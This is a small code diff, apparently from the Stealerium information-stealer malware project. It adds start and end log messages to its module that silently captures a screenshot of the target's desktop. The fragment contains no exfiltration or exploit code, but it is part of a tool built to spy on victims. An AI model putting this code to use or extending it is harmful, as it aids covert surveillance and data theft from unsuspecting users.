@@ -10,6 +10,7 @@ namespace Stealerium.Target.System
     {
         public static void Make(string sSavePath)
         {
+            Logging.Log("DesktopScreenshot started!");
             try
             {
                 var bounds = Screen.GetBounds(Point.Empty);
@@ -24,6 +25,7 @@ namespace Stealerium.Target.System
                 }
 
                 Counter.DesktopScreenshot = true;
+                Logging.Log("DesktopScreenshot Ended!");
             }
             catch (Exception ex)
             {
